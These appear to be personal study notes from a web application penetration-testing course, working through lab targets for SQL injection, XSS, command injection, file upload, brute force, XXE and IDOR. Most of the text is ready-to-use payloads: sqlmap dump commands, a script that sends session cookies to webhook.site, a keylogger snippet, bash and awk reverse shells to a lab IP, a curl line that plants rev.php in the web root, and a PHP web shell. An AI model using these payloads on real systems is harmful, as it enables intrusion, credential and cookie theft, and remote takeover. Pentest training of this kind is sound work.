
- [ ] SQL- Union | Blind

## Union
https://portswigger.net/web-security/sql-injection/cheat-sheet

Single & Double quotes
```
jeremy' or 1=1# 
```

at the end will use the terminator # aka pound sign or we can even use
```
jeremy' or 1=1-- -
```

Version
```
version()
```


```
jeremy' union select null,null,table_name from information_schema.tables#
```

```
jeremy' union select null,null,column_name from information_schema.columns#
```

```
jeremy' union select null,null,password from injection0x01#
```


## Blind

As we put wrong password we can see that it generated error (i.e. change in content lenght) and also we viewed in render in response code

Than will try username = jeremy' or 1=1#
but will encode it using ctrl + u 
```
username=jeremy'+or+1%3d1%23%26password=password
```

Sqlmap
Copy the request and paste into a txt file -> req.txt

>[! bug] Look for Injection Points
- user agents and think out of the box

```
Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#; 
```

On a live target Mentor says to reduce the number of requests as will get limited request like 3 to 5.
```
sqlmap -r req.txt
```


```
substring((select version()), 1,1) = '7'#
```


```
sqlmap -r req2.txt --level=2 --dump -T injection0x02
```

```
sqlmap -r colleagues.req --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dump-all --exclude-sysdbs -v 3
```

<hr>



- [ ] XSS -DOM | Stored

Ctrl + Shift + C

```
alert(1)
```

is the most famous cross site scripting payload that you will come across.
Avoid using alter(1) cuz of the changes in Chrome and also how often it's filtered and detected.


Can use Netcat to listen locally or can use webhook.site
https://webhook.site/#!/2ba09e5e-3bbb-4103-8924-2cee42b01330


>[!warning]
In the real world when working as a pentest and exfilterating sensitive information, don't use public sites like webhook but can use EC2 instance or if vpn-ed into the network you can just use your local machine and listen.



>[! bug] Mentor recommend when u're testing for XSS either use print or prompt

### Reflected
LogKey: 
function logKey(event){console.log(event.key)}

document.addEventListner('keydown', logKey)


### Stored
Set up containers for our testing and this allows us to have multiple sessions open and test across different user accounts.

Mentor uses it for testing authorization issues:
to see if we can update Bob's account using Alice's session token.

But here will check if the CSS is indeed stored and not just showing up for the same user that post the payload.

Search Firefox containers
https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/


>[! important] HTML injection

Something that you might want to consider is that when testing for cross site scripting you can test for HTML injection first.

```
<h1>Test</h1>
```

```
<script>alert(document.cookie)</script>
```

```
<script>prompt(document.cookie)</script>
```



>[! warning]

Best Practice is the set the cookies to HTTP only, which is a flag that prevents JavaScript from accessing your cookie.


### DOM-based

This is DOM based cross site scripting Cuz what happens is, if we look at the network tab here we just reload the page quickly.

When we actually send information we can see that there is no request going and coming back to the server.

As this is entirely happening locally and it's vulnerability within the client this is DOM based CSS.

```
<script>prompt(1)</script>
```

```
<img src=x onerror="prompt(1)">
```
is a quite common payload when the document tries to load X it will throw an error and on the error we can execute some JS.


Re-direct the user to another website
Command : window.location.href
```
<img src=x onerror="window.location.href ='' ">
```


```
<script>var i = new Image; i.src="https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3/?"+document.cookie;</script>
```


<hr>

- [ ] Command Injection - Blind


Basic command chaining
```
; ls -la
```


Using logic operators
```
&& ls -la
```


Commenting out the rest of a command
```
; ls -la #
```


Using a pipe for command chaining
```
| ls -la
```


>[!warning] Let's see if we can pop a shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Will try the Bash TCP:
```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

but to know the bash path will run the command
```
which/bash
```

### Blind Injection

It look's like a this is blind command injection
So will use Weekhook.site and will use back tick `` to run the command
https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3?``

```
https://webhook.site/e0edf9f6-fb9d-4bda-9d7c-22fbf2a697c3?`whoami`
```


```
Command: https://tcm-sec.com && curl 192.168.17.133:8080/rev.php > /var/www/html/rev.php
```


>[!bug]  Don't forget to read the error msg carefully

```
10)^2))}';whoami;#
```

```
10)^2))}';which php;#
```

```
10)^2))}';/usr/bin/awk 'BEGIN {s = "/inet/tcp/0/192.168.17.133/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null;#
```


<hr>


- [ ] Insecure File Upload - Basic | Magic Bytes

https://appsecexplained.gitbook.io/appsecexplained/common-vulns/insecure-file-upload

Open the dev tools for that press Q to inspect and go in the Network tab and just reload the website.

```
<?php sysyem($_GET['cmd']); ?>
```
Here GET is a super global which means this is going to get the value of the parameter that's sent in get requests.


## Magic Bytes

>[! warning] From we are sure that the checks are happening at the Server Side this time.

NOw we have 2 thoughts here:
1st that we can't upload php file here
2nd is that how are you actually checking the files

Here �PNG is the mmagic byte for png
```
▒
����lk�7�,ZtSoftwareAdobe ImageReadyq�e<3�IDATx���      |����p��B�Ik�$mV$!��mR����9�]�-�v��o�����n������
```



## Null Bytes 

This trick works in old servers
```
logo2.php%00png
```
here %00 is called the null byte and this terminates so when the web server calls it
interprets this differently.

Null Byte attacks are kind of an old but gold vulnerability.
And if an application is not configured correctly (i.e. htaccess file is configured incorrectly so sometimes we can get execution like this cuz this will try and regex for the php without including the end of line here.)


- [ ] Authentication - Brute Force | MFA

### Brute Force

```
username=jeremy&password=FUZZ
```

```
ffuf -request req.txt -W /usffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814
```



### MFA

```
ffuf -request teashop.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376,3256
```



- [ ] XXE

```
It's definately worth testing if you can application accepting and passing XML and Mentor also encurages you to try sending XML data to things like API endpoints than expect JSON as sometimes they will also accept XML and than with further testing you might find that the endpoint is actually vulnerable.

let's say if we want to use greater than entity: 
&gt;
&amp;
```

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection


- [ ] IDOR

```
And this vulnerablity is fairly trivial to find and exploit and we actually see a lot of API driven applications though in that situation we actually call it BOLA (i.e. broken objects level authorization.)

So BOLA and IDOR are basically the same vulnerability.
```


The easiest way to test for IDOR is essentially find a point where you're able to manipulate an object's ID and than simply change it.

```
Will make a file name num.txt using python command from number 1 to 2001
 python3 -c "for i in range (1,2001): print(i)" > num.txt
```


Now will simply pass the num.txt file through the URL using the FFUF and filter using size we get less entries as output which is good as earlier we were getting false positive.

```
ffuf -u "http://localhost/labs/e0x02.php?account=FUZZ" -w num.txt -fs 849 
```


I made the one lines script but it needs some if and else to get add in the output.

```
for i in `cat $file`;do curl -v --silent http://localhost/labs/e0x02.php?account="$i" 2>&1 | grep Type + echo "$i">> put.txt;done; 
```



